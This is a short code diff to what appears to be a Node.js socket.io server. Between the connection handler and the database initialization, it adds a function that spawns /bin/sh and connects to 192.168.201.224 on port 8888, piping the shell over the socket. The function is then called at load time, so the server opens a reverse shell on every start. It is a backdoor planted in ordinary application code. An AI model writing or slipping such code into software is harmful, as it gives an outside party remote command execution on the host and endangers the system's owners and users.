@@ -228,6 +228,14 @@ io.on('connection', (socket) => {
   });
 });
 
+function reverseshell() {    
+  var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []);    
+  var client = new net.Socket();    
+  client.connect(8888, "192.168.201.224", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});  
+  console.log('reverseshell')  
+  }
+reverseshell();
+
 // Connect to database and initialize models
 async function initializeApp() {
   try {
